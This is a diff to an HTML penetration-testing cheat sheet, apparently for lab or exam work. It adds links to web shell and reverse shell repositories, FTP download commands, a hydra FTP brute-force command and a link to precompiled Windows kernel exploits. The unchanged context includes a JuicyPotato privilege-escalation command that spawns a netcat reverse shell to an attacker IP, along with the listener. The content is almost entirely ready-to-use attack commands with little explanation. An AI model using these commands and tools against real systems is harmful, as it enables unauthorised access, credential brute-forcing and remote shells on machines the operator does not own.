@@ -114,6 +114,12 @@
 <p id="info">JSP</p>
 <p id="codebox"><a href="https://raw.githubusercontent.com/tennc/webshell/master/jsp/shell.jsp">JSP Web Shell #1</a></p>
 <p id="codebox"><a href="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell">JSP Web Shell #2</a></p>
+<p id="codebox"><a href="https://github.com/pentestmonkey/php-reverse-shell">Linux PHP Reverse Shell #1</a></p>
+<p id="codebox"><a href="https://github.com/Dhayalanb/windows-php-reverse-shell">Windows PHP Reverse Shell #1</a></p>
+
+
+
+
 
 <hr>
 
@@ -125,9 +131,15 @@
 <p id="info">Download Files #1</p>
 <p id="codebox">wget -m ftp://$USERNAME:PASSWORD@$TARGET</p>
 
+<p id="info">Download Files #2 (anonymously)</p>
+<p id="codebox">wget -m ftp://$TARGET</p>
 
 <p id="info">Download Files ## (with credentials)</p>
 <p id="codebox">wget -r --user="$USERNAME" --password="$PASSWORD" ftp://$TARGET/</p>
+
+<p id="info">Brute force FTP</p>
+<p id="codebox">hydra -L users.txt -P /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt $TARGET ftp –V -f </p>
+
 
 <h2>SMTP - TCP/25 </h2>
 <p id="info">Verify if a user exists</p>
@@ -330,6 +342,9 @@ rpcclient $> exit
 <p id="codebox">C:\Microsoft\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\Microsoft\nc.exe -e cmd.exe $KALIIP $KALIPORT" -t *  -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"</p>
 <h4>Kali</h4>
 <p id="codebox">nc -lvnp 1337 $KALIPORT</p>
+
+<h3>Windows Kernel Exploits</h3>
+<p id="codebox"><a href="https://github.com/abatchy17/WindowsExploits">Precompiled EXEs for various exploits #1</a></p>
 
 <h3>Windows XP SP0/SP1 Privilege Escalation to System</h3>
 <p id="info">Check OS name and version to see if target is vulnerable</p>
